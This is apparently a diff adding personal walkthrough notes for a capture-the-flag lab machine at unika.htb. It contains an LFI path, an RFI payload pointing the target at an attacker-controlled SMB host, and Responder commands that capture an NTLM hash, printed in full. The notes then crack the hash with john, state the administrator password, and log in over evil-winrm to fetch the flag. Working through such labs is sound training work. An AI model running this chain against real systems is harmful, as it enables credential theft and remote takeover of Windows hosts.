@@ -1,0 +1,30 @@
+When visiting the web service using the IP address, what is the domain that we are being redirected to? unika.htb
+
+Which scripting language is being used on the server to generate webpages?
+DNS_probe error -> add to /etc/hosts -> if you switch to french you see php
+
+What is the name of the URL parameter which is used to load different language versions of the webpage? page
+
+Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: ../../../../../../../../windows/system32/drivers/etc/hosts
+
+Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: //10.10.14.6/somefile
+
+What does NTLM stand for? New Technology Lan Manager
+
+Which flag do we use in the Responder utility to specify the network interface?
+Reponder --help -> -I
+
+There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what? john the ripper
+
+What is the password for the administrator user?
+sudo responder -I tun0 #because openvpn -> now change the url to unika.htb/index.php?page=//10.10.15.168/test
+Put responder output in hash.txt = Administrator::RESPONDER:46df17bc4758780e:4AE8A636802E5F429FC8EE7F94CEEC3A:010100000000000000D8DF79BDEFD8016D3D0A120F84C4260000000002000800370046003200310001001E00570049004E002D004B004B00540059005300310056004E004C003800350004003400570049004E002D004B004B00540059005300310056004E004C00380035002E0037004600320031002E004C004F00430041004C000300140037004600320031002E004C004F00430041004C000500140037004600320031002E004C004F00430041004C000700080000D8DF79BDEFD8010600040002000000080030003000000000000000010000000020000061907DC9CF3C0C50EB763194D84A56F69B47702099177B479139C61A72093B740A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100360038000000000000000000
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
+nmap -p- --min-rate 5000 -sV 10.129.194.208 -> 5985 #mostly associated with winRM
+
+evil-winrm -i 10.129.141.228 -u administrator -p badminton
+Get-ChildItem -Path C:\Users -Recuse -Include *flag*
+download c:\users\mike\desktop\flag.txt
+
